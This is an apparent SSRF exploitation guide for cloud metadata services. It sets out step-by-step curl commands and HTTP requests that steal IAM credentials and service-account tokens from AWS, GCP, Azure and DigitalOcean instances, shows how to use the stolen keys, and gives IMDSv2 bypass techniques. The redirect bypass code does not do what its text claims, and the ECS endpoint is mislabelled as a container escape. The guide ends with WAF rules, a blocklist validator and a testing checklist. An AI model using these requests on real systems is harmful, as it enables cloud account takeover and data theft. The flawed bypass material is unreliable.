# Cloud Metadata SSRF Exploitation Guide

## Overview

Server-Side Request Forgery targeting cloud provider metadata services is one of the highest-impact SSRF variants. Cloud instances expose internal metadata endpoints that return credentials, configuration, and sensitive infrastructure details.

---

## Cloud Provider Metadata Endpoints

### AWS EC2 Instance Metadata Service (IMDS)

```bash
# IMDSv1 (no authentication required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
curl http://169.254.169.254/latest/user-data/

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### GCP Metadata Server

```bash
# Requires Metadata-Flavor header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure Instance Metadata Service

```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### DigitalOcean Metadata

```bash
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

---

## SSRF to Cloud Credential Theft

### Step 1: Identify SSRF Vector

Common injection points:
- URL parameters: `?url=`, `?redirect=`, `?fetch=`, `?proxy=`
- Webhook configurations
- PDF generators (wkhtmltopdf, Puppeteer)
- Image/file import from URL
- API integrations with user-supplied endpoints

### Step 2: Probe Metadata Endpoint

```http
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
```

### Step 3: Extract IAM Credentials

```http
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com
```

Response reveals role name. Then:

```http
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role HTTP/1.1
Host: target.com
```

### Step 4: Use Stolen Credentials

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
aws s3 ls
```

---

## IMDSv2 Bypass Techniques

IMDSv2 requires a PUT request to obtain a token, which most SSRF vectors cannot perform. However:

### Bypass via HTTP Redirect

If the SSRF follows redirects and the redirect target can issue a PUT:

```python
# Attacker-controlled redirect server
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/redirect')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/', code=307)
```

### Bypass via DNS Rebinding

```
1. Victim fetches attacker.com (resolves to attacker IP)
2. TTL expires, DNS rebinds to 169.254.169.254
3. Second request hits metadata service
```

### Bypass via Container Escape

ECS task metadata endpoint (no IMDSv2 protection):

```bash
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

---

## Detection and Prevention

### WAF Rules

```yaml
# Block metadata IP ranges
- condition: request.url contains "169.254.169.254"
  action: block
- condition: request.url contains "metadata.google.internal"
  action: block
```

### Application-Level Controls

```python
import ipaddress

BLOCKED_RANGES = [
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local
    ipaddress.ip_network('10.0.0.0/8'),        # Private
    ipaddress.ip_network('172.16.0.0/12'),     # Private
    ipaddress.ip_network('192.168.0.0/16'),    # Private
    ipaddress.ip_network('127.0.0.0/8'),       # Loopback
]

def is_safe_url(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)
    addr = ipaddress.ip_address(ip)
    return not any(addr in net for net in BLOCKED_RANGES)
```

### AWS IMDSv2 Enforcement

```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

---

## Real-World Case Studies

### Capital One (2019)

- SSRF in WAF configuration allowed access to EC2 metadata
- Attacker retrieved IAM credentials via IMDSv1
- Exfiltrated 100M+ customer records from S3
- Impact: $80M+ in fines and remediation

### Shopify (2020)

- SSRF in partner dashboard screenshot feature
- Accessed GCP metadata service
- Retrieved service account tokens with broad permissions

---

## Testing Checklist

- [ ] Test all URL input fields for SSRF
- [ ] Verify metadata endpoint blocking (169.254.169.254)
- [ ] Check if IMDSv2 is enforced (PUT requirement)
- [ ] Test DNS rebinding against metadata protections
- [ ] Verify redirect following behavior
- [ ] Check container metadata endpoints (ECS/EKS)
- [ ] Test IPv6 metadata access (fd00:ec2::254)
